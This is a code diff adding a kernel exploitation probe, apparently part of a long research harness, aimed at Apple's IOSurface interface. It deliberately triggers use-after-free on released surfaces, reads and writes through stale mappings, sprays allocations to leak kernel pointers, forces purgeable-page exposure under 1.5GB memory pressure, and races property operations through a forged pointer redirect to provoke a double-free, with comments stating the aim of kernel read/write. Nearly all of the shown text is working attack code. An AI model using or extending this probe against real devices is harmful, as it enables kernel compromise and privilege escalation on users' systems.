@@ -16141,6 +16141,377 @@ static void r393_probe(void) {
 }
 
 /*
+ * r397: Dangling mapping + aggressive purgeable + property race.
+ *
+ * Key theories to test:
+ *   1) Dangling backing store: Lock surface, don't Unlock, clientRelease.
+ *      Does the mapping survive? If the kernel frees the IOSurface object
+ *      and its physical pages get reused, we have kernel R/W.
+ *   2) Aggressive purgeable: 32MB wasn't enough for 11.3GB RAM. Try 1GB+.
+ *   3) Concurrent property set/remove: two threads racing on the same
+ *      surface through direct + redirect paths. If the kernel uses
+ *      per-connection locking (not per-surface), this could cause a double-free.
+ */
+static volatile int g_r397_crashed = 0;
+static sigjmp_buf g_r397_jmp;
+static void r397_sighandler(int sig) {
+    g_r397_crashed = sig;
+    siglongjmp(g_r397_jmp, 1);
+}
+
+static volatile int g_r397_race_done = 0;
+
+static void *r397_race_remover(void *arg) {
+    IOSurfaceRef surf = (IOSurfaceRef)arg;
+    while (!g_r397_race_done) {
+        for (int i = 0; i < 100; i++) {
+            char key[32];
+            snprintf(key, sizeof(key), "Race_%d", i);
+            CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+            IOSurfaceRemoveValue(surf, cfk);
+            CFRelease(cfk);
+        }
+    }
+    return NULL;
+}
+
+static void r397_probe(void) {
+    rlog("\n=== r397: Dangling Mapping + Aggressive Purgeable + Race ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    struct sigaction sa397, old_bus397, old_segv397;
+    memset(&sa397, 0, sizeof(sa397));
+    sa397.sa_handler = r397_sighandler;
+    sa397.sa_flags = 0;
+    sigaction(SIGBUS, &sa397, &old_bus397);
+    sigaction(SIGSEGV, &sa397, &old_segv397);
+
+    /* ---- Phase 1: Dangling backing store mapping ---- */
+    rlog("  Phase 1: Dangling backing store mapping\n");
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    IOSurfaceRef dangSurf = IOSurfaceCreate(props);
+    uint32_t dangSid = IOSurfaceGetID(dangSurf);
+    rlog("    Created surface sid=%u ptr=%p\n", dangSid, dangSurf);
+
+    /* Lock and get base address — keep locked */
+    IOSurfaceLock(dangSurf, 0, NULL);
+    void *dangBase = IOSurfaceGetBaseAddress(dangSurf);
+    size_t dangSize = IOSurfaceGetAllocSize(dangSurf);
+    rlog("    Locked: base=%p size=%zu\n", dangBase, dangSize);
+
+    /* Fill with known pattern */
+    memset(dangBase, 0xCC, dangSize);
+    rlog("    Filled with 0xCC\n");
+
+    /* Save the base address before releasing */
+    uintptr_t savedBase = (uintptr_t)dangBase;
+
+    /* clientRelease — frees the client ref, kernel object may survive */
+    uintptr_t dangAddr = (uintptr_t)dangSurf;
+    clientRelease(dangSurf);
+    rlog("    clientRelease done (DID NOT unlock)\n");
+
+    /* Try to read the stale mapping */
+    g_r397_crashed = 0;
+    if (sigsetjmp(g_r397_jmp, 1) == 0) {
+        uint8_t *p = (uint8_t*)savedBase;
+        rlog("    Stale mapping read: %02x %02x %02x %02x %02x %02x %02x %02x\n",
+            p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7]);
+        int still_cc = (p[0] == 0xCC && p[1] == 0xCC);
+        rlog("    Still 0xCC? %s\n", still_cc ? "YES (mapping alive)" : "NO (content changed!)");
+
+        if (still_cc) {
+            /* Write a new pattern */
+            memset((void*)savedBase, 0xEE, dangSize);
+            rlog("    Wrote 0xEE through stale mapping\n");
+
+            /* Create many surfaces to trigger allocator reuse */
+            rlog("    Creating 100 surfaces to pressure allocator...\n");
+            IOSurfaceRef temps[100];
+            for (int i = 0; i < 100; i++) {
+                temps[i] = IOSurfaceCreate(props);
+            }
+
+            /* Re-read stale mapping */
+            p = (uint8_t*)savedBase;
+            rlog("    After pressure: %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7]);
+            int changed = (p[0] != 0xEE);
+            rlog("    Content changed from 0xEE? %s\n",
+                changed ? "YES *** KERNEL DATA VISIBLE ***" : "NO (still our data)");
+
+            if (changed) {
+                /* Dump first 128 bytes for analysis */
+                rlog("    DUMP: ");
+                for (int j = 0; j < 128; j++) rlog("%02x", p[j]);
+                rlog("\n");
+                /* Check for pointer-like values (kernel addresses typically 0xffff...) */
+                uint64_t *q = (uint64_t*)savedBase;
+                for (int j = 0; j < 16; j++) {
+                    if ((q[j] >> 48) == 0xffff || (q[j] >> 48) == 0xfffe) {
+                        rlog("    *** KERNEL POINTER at +%d: 0x%llx ***\n",
+                            j*8, (unsigned long long)q[j]);
+                    }
+                }
+            }
+
+            for (int i = 0; i < 100; i++) CFRelease(temps[i]);
+        }
+    } else {
+        rlog("    CRASHED reading stale mapping: signal %d\n", g_r397_crashed);
+        rlog("    (Mapping was torn down by kernel)\n");
+    }
+    fflush(stdout);
+
+    /* ---- Phase 2: Aggressive purgeable (1GB+ pressure) ---- */
+    rlog("\n  Phase 2: Aggressive purgeable (1GB+ pressure)\n");
+
+    /* Create large purgeable surface (1MB) */
+    int pw=512, ph=512, pbpe=4, pbpr=512*4, ppf=0x42475241, pas=512*512*4;
+    CFMutableDictionaryRef pprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef pnW = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef pnH = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pnB = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef pnR = CFNumberCreate(NULL, kCFNumberIntType, &pbpr);
+    CFNumberRef pnP = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFNumberRef pnA = CFNumberCreate(NULL, kCFNumberIntType, &pas);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceWidth"), pnW);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceHeight"), pnH);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceBytesPerElement"), pnB);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceBytesPerRow"), pnR);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfacePixelFormat"), pnP);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceAllocSize"), pnA);
+
+    IOSurfaceRef purgeSurf2 = IOSurfaceCreate(pprops);
+    uint32_t purgeSid2 = IOSurfaceGetID(purgeSurf2);
+    rlog("    Purgeable surface: sid=%u alloc=%d (1MB)\n", purgeSid2, pas);
+
+    IOSurfaceLock(purgeSurf2, 0, NULL);
+    void *pbase2 = IOSurfaceGetBaseAddress(purgeSurf2);
+    memset(pbase2, 0xBB, pas);
+    IOSurfaceUnlock(purgeSurf2, 0, NULL);
+    rlog("    Filled with 0xBB\n");
+
+    uint32_t oldSt2 = 0;
+    IOSurfaceSetPurgeable(purgeSurf2, kIOSurfacePurgeableVolatile, &oldSt2);
+    rlog("    Marked volatile\n");
+
+    /* Aggressive pressure: allocate up to 1.5GB */
+    rlog("    Generating 1.5GB pressure...\n");
+    fflush(stdout);
+    #define R397_BIG_PAGES 98304  /* 98304 * 16KB = 1.5GB */
+    int alloc_count = 0;
+    void **bigpressure = (void**)malloc(R397_BIG_PAGES * sizeof(void*));
+    for (int i = 0; i < R397_BIG_PAGES; i++) {
+        bigpressure[i] = mmap(NULL, 16384, PROT_READ|PROT_WRITE,
+            MAP_ANON|MAP_PRIVATE, -1, 0);
+        if (bigpressure[i] != MAP_FAILED) {
+            /* Touch every page to force physical allocation */
+            *(volatile uint8_t*)bigpressure[i] = (uint8_t)(i & 0xFF);
+            alloc_count++;
+        } else {
+            break;
+        }
+    }
+    rlog("    Allocated %d pages (%d MB)\n", alloc_count, alloc_count * 16384 / (1024*1024));
+
+    uint32_t newSt2 = 0;
+    IOReturn pr2 = IOSurfaceSetPurgeable(purgeSurf2, kIOSurfacePurgeableNonVolatile, &newSt2);
+    rlog("    SetPurgeable(non-volatile): ret=0x%x state=%u", pr2, newSt2);
+    if (newSt2 == kIOSurfacePurgeableEmpty) {
+        rlog(" *** PAGES PURGED ***\n");
+
+        /* Read back — look for kernel residue */
+        IOSurfaceLock(purgeSurf2, kIOSurfaceLockReadOnly, NULL);
+        uint8_t *pd2 = (uint8_t*)IOSurfaceGetBaseAddress(purgeSurf2);
+        int zp = 0, pp = 0, op = 0;
+        for (int pg = 0; pg < pas / 16384; pg++) {
+            uint8_t *page = pd2 + pg * 16384;
+            int is_zero = 1, is_pat = 1;
+            for (int b = 0; b < 16384; b += 8) {
+                uint64_t qw = *(uint64_t*)(page + b);
+                if (qw != 0) is_zero = 0;
+                if (qw != 0xBBBBBBBBBBBBBBBBULL) is_pat = 0;
+            }
+            if (is_zero) zp++;
+            else if (is_pat) pp++;
+            else {
+                op++;
+                if (op <= 3) {
+                    rlog("    Page %d: INTERESTING!\n    ", pg);
+                    for (int j = 0; j < 64; j++) rlog("%02x", page[j]);
+                    rlog("\n");
+                    /* Check for kernel pointers */
+                    uint64_t *q = (uint64_t*)page;
+                    for (int j = 0; j < 8; j++) {
+                        if ((q[j] >> 48) == 0xffff || (q[j] >> 48) == 0xfffe) {
+                            rlog("    *** KERNEL PTR at pg%d+%d: 0x%llx ***\n",
+                                pg, j*8, (unsigned long long)q[j]);
+                        }
+                    }
+                }
+            }
+        }
+        IOSurfaceUnlock(purgeSurf2, kIOSurfaceLockReadOnly, NULL);
+        rlog("    Pages: %d zero, %d pattern(0xBB), %d OTHER\n", zp, pp, op);
+    } else {
+        rlog(" (retained — need more pressure)\n");
+    }
+
+    /* Free pressure */
+    for (int i = 0; i < alloc_count; i++) {
+        if (bigpressure[i] != MAP_FAILED) munmap(bigpressure[i], 16384);
+    }
+    free(bigpressure);
+    CFRelease(purgeSurf2);
+    CFRelease(pprops);
+    fflush(stdout);
+
+    /* ---- Phase 3: Property race (concurrent set/remove) ---- */
+    rlog("\n  Phase 3: Property race (concurrent set + remove)\n");
+
+    /* Set up cross-surface redirect (r394 pattern) */
+    IOSurfaceRef raceA = IOSurfaceCreate(props);
+    IOSurfaceRef raceB = IOSurfaceCreate(props);
+    uint32_t raceSidA = IOSurfaceGetID(raceA);
+    uint32_t raceSidB = IOSurfaceGetID(raceB);
+    rlog("    raceA: sid=%u  raceB: sid=%u\n", raceSidA, raceSidB);
+
+    uint8_t raceDataA[512];
+    memcpy(raceDataA, (void*)raceA, 512);
+    uintptr_t raceFreeB = (uintptr_t)raceB;
+    clientRelease(raceB);
+    memcpy((void*)raceFreeB, raceDataA, 448);
+    rlog("    Redirect raceB→raceA established\n");
+
+    /* Start remover thread on raceA directly */
+    g_r397_race_done = 0;
+    pthread_t remover_thread;
+    pthread_create(&remover_thread, NULL, r397_race_remover, (void*)raceA);
+
+    /* Main thread: set properties through redirect */
+    int race_crashes = 0;
+    int race_ok = 0;
+    for (int iter = 0; iter < 1000; iter++) {
+        int idx = iter % 100;
+        char key[32];
+        snprintf(key, sizeof(key), "Race_%d", idx);
+        int val = iter;
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        CFNumberRef cfv = CFNumberCreate(NULL, kCFNumberIntType, &val);
+
+        g_r397_crashed = 0;
+        if (sigsetjmp(g_r397_jmp, 1) == 0) {
+            IOSurfaceSetValue(raceB, cfk, cfv);
+            race_ok++;
+        } else {
+            race_crashes++;
+            if (race_crashes >= 5) {
+                CFRelease(cfk);
+                CFRelease(cfv);
+                rlog("    Too many crashes (%d), stopping race\n", race_crashes);
+                break;
+            }
+        }
+        CFRelease(cfk);
+        CFRelease(cfv);
+    }
+    g_r397_race_done = 1;
+    pthread_join(remover_thread, NULL);
+    rlog("    Race complete: %d OK, %d crashes\n", race_ok, race_crashes);
+
+    /* Check if raceA is still sane */
+    CFDictionaryRef raceVals = IOSurfaceCopyAllValues(raceA);
+    if (raceVals) {
+        CFIndex rc = CFDictionaryGetCount(raceVals);
+        rlog("    raceA has %ld properties after race\n", (long)rc);
+        CFRelease(raceVals);
+    } else {
+        rlog("    CopyAllValues returned NULL *** POSSIBLE CORRUPTION ***\n");
+    }
+    fflush(stdout);
+
+    /* ---- Phase 4: Lookup-after-release ---- */
+    rlog("\n  Phase 4: IOSurfaceLookup after clientRelease\n");
+
+    IOSurfaceRef lookSurf = IOSurfaceCreate(props);
+    uint32_t lookSid = IOSurfaceGetID(lookSurf);
+    rlog("    Created surface sid=%u\n", lookSid);
+
+    /* Set a property on it */
+    int lv = 0xCAFE;
+    CFNumberRef ln = CFNumberCreate(NULL, kCFNumberIntType, &lv);
+    IOSurfaceSetValue(lookSurf, CFSTR("LookupTest"), ln);
+    CFRelease(ln);
+
+    /* clientRelease the surface */
+    clientRelease(lookSurf);
+    rlog("    clientRelease done\n");
+
+    /* Try to look it up by ID — this creates a FRESH client ref */
+    IOSurfaceRef lookRef2 = IOSurfaceLookup(lookSid);
+    if (lookRef2) {
+        rlog("    IOSurfaceLookup(%u) returned %p (kernel object alive!)\n", lookSid, lookRef2);
+        /* Check if property survived */
+        CFTypeRef lrv = IOSurfaceCopyValue(lookRef2, CFSTR("LookupTest"));
+        if (lrv) {
+            int lval = 0;
+            CFNumberGetValue((CFNumberRef)lrv, kCFNumberIntType, &lval);
+            rlog("    LookupTest: 0x%x %s\n", lval, lval == 0xCAFE ? "MATCH" : "MISMATCH");
+            CFRelease(lrv);
+        } else {
+            rlog("    LookupTest: missing\n");
+        }
+
+        /* Can we get the base address of a surface we didn't create? */
+        IOSurfaceLock(lookRef2, kIOSurfaceLockReadOnly, NULL);
+        void *lookBase = IOSurfaceGetBaseAddress(lookRef2);
+        size_t lookSize = IOSurfaceGetAllocSize(lookRef2);
+        rlog("    Lookup ref base: %p size: %zu\n", lookBase, lookSize);
+        if (lookBase) {
+            uint8_t *lp = (uint8_t*)lookBase;
+            rlog("    First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                lp[0],lp[1],lp[2],lp[3],lp[4],lp[5],lp[6],lp[7]);
+        }
+        IOSurfaceUnlock(lookRef2, kIOSurfaceLockReadOnly, NULL);
+
+        CFRelease(lookRef2);
+    } else {
+        rlog("    IOSurfaceLookup(%u) returned NULL — kernel object freed\n", lookSid);
+    }
+    fflush(stdout);
+
+    /* Cleanup */
+    sigaction(SIGBUS, &old_bus397, NULL);
+    sigaction(SIGSEGV, &old_segv397, NULL);
+    CFRelease(raceA);
+    CFRelease(props);
+
+    rlog("\n=== r397 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r396: Metadata enumeration + purgeable data exposure.
  *
  * Uses r394's proven 3-surface pattern (create A,B,C; free B; spray).
@@ -62829,6 +63200,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 400) {
+            rlog("*** rounds=400: Dangling Mapping + Aggressive Purgeable + Race ***\n");
+            rlog("  Stale mapping, 1.5GB pressure, concurrent property race, lookup-after-release.\n\n");
+            fflush(stdout);
+            r397_probe();
+            goto done;
+        }
         if (rounds == 399) {
             rlog("*** rounds=399: Metadata Enumeration + Purgeable Data Exposure ***\n");
             rlog("  CopyAllValues, purgeable exposure, redirect-purge, kalloc sizing.\n\n");
@@ -65214,7 +65592,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
